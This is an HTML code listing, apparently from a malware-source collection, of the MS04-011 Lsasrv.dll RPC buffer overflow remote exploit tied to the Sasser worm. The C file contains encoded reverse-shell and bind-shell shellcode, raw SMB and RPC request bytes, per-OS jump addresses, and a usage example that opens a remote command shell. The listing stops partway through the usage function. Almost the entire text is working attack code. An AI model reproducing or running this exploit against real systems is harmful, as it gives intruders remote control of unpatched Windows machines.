<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Win32.Sasser.a - sasser_remote.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*  HOD-ms04011-lsasrv-expl.c:
 *
 *  MS04011 Lsasrv.dll RPC buffer overflow remote exploit
 *  Version 0.1 coded by
 *
 *
 *                 .::[ houseofdabus ]::.
 *
 *
 * -------------------------------------------------------------------
 * Usage:
 *
 * expl &lt;target&gt; &lt;victim IP&gt; &lt;bindport&gt; [connectback IP] [options]
 *
 * Targets:
 *        0 [0x01004600]: WinXP Professional    [universal] lsass.exe
 *        1 [0x7515123c]: Win2k Professional    [universal] netrap.dll
 *        2 [0x751c123c]: Win2k Advanced Server [SP4]       netrap.dll
 *
 * Options:
 *        -t:             Detect remote OS:
 *                        Windows 5.1 - WinXP
 *                        Windows 5.0 - Win2k
 * -------------------------------------------------------------------
 *
 * Tested on 
 *        - Windows XP Professional SP0 English version
 *        - Windows XP Professional SP0 Russian version
 *        - Windows XP Professional SP1 English version
 *        - Windows XP Professional SP1 Russian version
 *        - Windows 2000 Professional SP2 English version
 *        - Windows 2000 Professional SP2 Russian version
 *        - Windows 2000 Professional SP4 English version
 *        - Windows 2000 Professional SP4 Russian version
 *        - Windows 2000 Advanced Server SP4 English version 
 *        - Windows 2000 Advanced Server SP4 Russian version 
 *
 *
 * Example:
 *
 * C:\HOD-ms04011-lsasrv-expl 0 192.168.1.10 4444 -t
 *
 * MS04011 Lsasrv.dll RPC buffer overflow remote exploit v0.1
 * --- Coded by .::[ houseofdabus ]::. ---
 *
 * [*] Target: IP: 192.168.1.10: OS: WinXP Professional    [universal] lsass.exe
 * [*] Connecting to 192.168.1.10:445 ... OK
 * [*] Detecting remote OS: Windows 5.0
 *
 *
 * C:\HOD-ms04011-lsasrv-expl 1 192.168.1.10 4444
 *  
 * MS04011 Lsasrv.dll RPC buffer overflow remote exploit v0.1
 * --- Coded by .::[ houseofdabus ]::. ---
 *
 * [*] Target: IP: 192.168.1.10: OS: Win2k Professional    [universal] netrap.dll
 * [*] Connecting to 192.168.1.10:445 ... OK
 * [*] Attacking ... OK
 *
 * C:\nc 192.168.1.10 4444
 * Microsoft Windows 2000 [Version 5.00.2195]
 * (C) Copyright 1985-2000 Microsoft Corp.
 *
 * C:\WINNT\system32&gt;
 *
 *
 *
 *   This is provided as proof-of-concept code only for educational 
 *   purposes and testing by authorized individuals with permission to 
 *   do so.
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;windows.h&gt;
</span><span class="sc0">
</span><span class="sc9">#pragma comment(lib, "ws2_32")
</span><span class="sc0">
</span><span class="sc2">// reverse shellcode
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">reverseshell</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"</span><span class="sc0">
</span><span class="sc6">"\xEB\x05\xE8\xEB\xFF\xFF\xFF"</span><span class="sc0">
</span><span class="sc6">"\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"</span><span class="sc0">
</span><span class="sc6">"\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3\x9D\xC0\x71\x02\x99\x99\x99"</span><span class="sc0">
</span><span class="sc6">"\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE\xEA\xAB\xC6\xCD\x66\x8F\x12"</span><span class="sc0">
</span><span class="sc6">"\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99\x7B\x60\x18\x75\x09\x98\x99"</span><span class="sc0">
</span><span class="sc6">"\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF\x89\xC9\xC9\xC9\xC9\xD9\xC9"</span><span class="sc0">
</span><span class="sc6">"\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6\x99\x99\x98\xF1\x9B\x99\x9D"</span><span class="sc0">
</span><span class="sc6">"\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF\x81\x1C\x59\xEC\xD3\xF1\xFA"</span><span class="sc0">
</span><span class="sc6">"\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD\x14\xA5\xBD\xF3\x8C\xC0\x32"</span><span class="sc0">
</span><span class="sc6">"\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA4\x10\xC5\xBD\xD1\x10"</span><span class="sc0">
</span><span class="sc6">"\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD\xBD\x89\xCD\xC9\xC8\xC8\xC8"</span><span class="sc0">
</span><span class="sc6">"\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66\xCF\x9D\x12\x55\xF3\x66\x66"</span><span class="sc0">
</span><span class="sc6">"\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66\xCF\x95\xC8\xCF\x12\xDC\xA5"</span><span class="sc0">
</span><span class="sc6">"\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB\xB9\x9A\x6C\xAA\x50\xD0\xD8"</span><span class="sc0">
</span><span class="sc6">"\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3\x4F\xED\x91\x58\x52\x94\x9A"</span><span class="sc0">
</span><span class="sc6">"\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3\x12\xC3\xBD\x9A\x44\xFF\x12"</span><span class="sc0">
</span><span class="sc6">"\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D\x12\x9A\x5C\x32\xC7\xC0\x5A"</span><span class="sc0">
</span><span class="sc6">"\x71\x99\x66\x66\x66\x17\xD7\x97\x75\xEB\x67\x2A\x8F\x34\x40\x9C"</span><span class="sc0">
</span><span class="sc6">"\x57\x76\x57\x79\xF9\x52\x74\x65\xA2\x40\x90\x6C\x34\x75\x60\x33"</span><span class="sc0">
</span><span class="sc6">"\xF9\x7E\xE0\x5F\xE0"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">// bind shellcode
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bindshell</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"</span><span class="sc0">
</span><span class="sc6">"\xEB\x05\xE8\xEB\xFF\xFF\xFF"</span><span class="sc0">
</span><span class="sc6">"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"</span><span class="sc0">
</span><span class="sc6">"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"</span><span class="sc0">
</span><span class="sc6">"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"</span><span class="sc0">
</span><span class="sc6">"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"</span><span class="sc0">
</span><span class="sc6">"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"</span><span class="sc0">
</span><span class="sc6">"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"</span><span class="sc0">
</span><span class="sc6">"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"</span><span class="sc0">
</span><span class="sc6">"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"</span><span class="sc0">
</span><span class="sc6">"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"</span><span class="sc0">
</span><span class="sc6">"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"</span><span class="sc0">
</span><span class="sc6">"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"</span><span class="sc0">
</span><span class="sc6">"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"</span><span class="sc0">
</span><span class="sc6">"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"</span><span class="sc0">
</span><span class="sc6">"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"</span><span class="sc0">
</span><span class="sc6">"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"</span><span class="sc0">
</span><span class="sc6">"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"</span><span class="sc0">
</span><span class="sc6">"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"</span><span class="sc0">
</span><span class="sc6">"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"</span><span class="sc0">
</span><span class="sc6">"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"</span><span class="sc0">
</span><span class="sc6">"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"</span><span class="sc0">
</span><span class="sc6">"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"</span><span class="sc0">
</span><span class="sc6">"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"</span><span class="sc0">
</span><span class="sc6">"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"</span><span class="sc0">
</span><span class="sc6">"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99"</span><span class="sc10">;</span><span class="sc0">



</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req1</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"</span><span class="sc0">
</span><span class="sc6">"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"</span><span class="sc0">
</span><span class="sc6">"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"</span><span class="sc0">
</span><span class="sc6">"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"</span><span class="sc0">
</span><span class="sc6">"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"</span><span class="sc0">
</span><span class="sc6">"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"</span><span class="sc0">
</span><span class="sc6">"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req2</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"</span><span class="sc0">
</span><span class="sc6">"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"</span><span class="sc0">
</span><span class="sc6">"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"</span><span class="sc0">
</span><span class="sc6">"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"</span><span class="sc0">
</span><span class="sc6">"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"</span><span class="sc0">
</span><span class="sc6">"\x2E\x00\x30\x00\x00\x00\x00\x00"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req3</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"</span><span class="sc0">
</span><span class="sc6">"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"</span><span class="sc0">
</span><span class="sc6">"\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF"</span><span class="sc0">
</span><span class="sc6">"\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"</span><span class="sc0">
</span><span class="sc6">"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"</span><span class="sc0">
</span><span class="sc6">"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"</span><span class="sc0">
</span><span class="sc6">"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"</span><span class="sc0">
</span><span class="sc6">"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req4</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x5C\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x30\x00\x04\xFF\x00\x5C\x00\x08\x00\x01\x00\x31\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x5C\x00\x5C\x00\x31\x00\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00"</span><span class="sc0">
</span><span class="sc6">"\x38\x00\x2E\x00\x31\x00\x2E\x00\x32\x00\x31\x00\x30\x00\x5C\x00"</span><span class="sc0">
</span><span class="sc6">"\x49\x00\x50\x00\x43\x00\x24"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req5</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x64\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x0E\x00\x16\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x02\x00\x00\x00\x03\x11\x00\x00\x5C\x00\x6C\x00\x73\x00\x61\x00"</span><span class="sc0">
</span><span class="sc6">"\x72\x00\x70\x00\x63\x00\x00\x00"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req6</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x04\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"</span><span class="sc0">
</span><span class="sc6">"\x00\x26\x00\x00\x40\x59\x00\x10\x5C\x00\x50\x00\x49\x00\x50\x00"</span><span class="sc0">
</span><span class="sc6">"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x01\x00\x6A\x28\x19\x39\x0C\xB1\xD0\x11"</span><span class="sc0">
</span><span class="sc6">"\x9B\xA8\x00\xC0\x4F\xD9\x2E\xF5\x00\x00\x00\x00\x04\x5D\x88\x8A"</span><span class="sc0">
</span><span class="sc6">"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req7</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02"</span><span class="sc0">
</span><span class="sc6">"\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00"</span><span class="sc0">
</span><span class="sc6">"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00"</span><span class="sc0">
</span><span class="sc6">"\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">// room for shellcode here ...
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">shit1</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">

</span><span class="sc6">"\x95\x14\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req8</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x10\xF8\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x60\x00\x0E\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF"</span><span class="sc0">
</span><span class="sc6">"\xFF\xFF\xFF\x08\x00\xB8\x10\x00\x00\xB8\x10\x40\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\xB9\x10\xEE\x05\x00\x00\x01\x10\x00\x00\x00\xB8\x10\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x0C\x20\x00\x00\x00\x00\x09\x00\xAD\x0D\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\xAD\x0D\x00\x00"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">// room for shellcode here ...
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">req9</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x0F\xD8\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x18\x01"</span><span class="sc0">
</span><span class="sc6">"\x00\x08\x70\x00\x10\x00\x00\x84\x0F\x00\x00\x00\x04\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x84\x0F\x54\x00\x02"</span><span class="sc0">
</span><span class="sc6">"\x00\x26\x00\x00\x40\x95\x0F\x00\x5C\x00\x50\x00\x49\x00\x50\x00"</span><span class="sc0">
</span><span class="sc6">"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x02\x10\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x84\x0F\x00\x00\x01\x00\x00\x00\x6C\x0F\x00\x00\x00\x00\x09\x00"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">shit3</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00"</span><span class="sc0">
</span><span class="sc6">"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00"</span><span class="sc0">
</span><span class="sc6">"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"</span><span class="sc10">;</span><span class="sc0">




</span><span class="sc9">#define LEN 3500
#define BUFSIZE 2000
#define NOP 0x90
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">jmpaddr</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">ttarget</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WinXP Professional    [universal] lsass.exe "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x01004600</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0"> </span><span class="sc2">// jmp esp addr
</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Win2k Professional    [universal] netrap.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x7515123c</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0"> </span><span class="sc2">// jmp ebx addr
</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Win2k Advanced Server [SP4]       netrap.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x751c123c</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0"> </span><span class="sc2">// jmp ebx addr
//{ 3, "reboot", 0xffffffff }, // crash
</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">prog</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Usage:\n\n"</span><span class="sc10">);</span><span class="sc0">
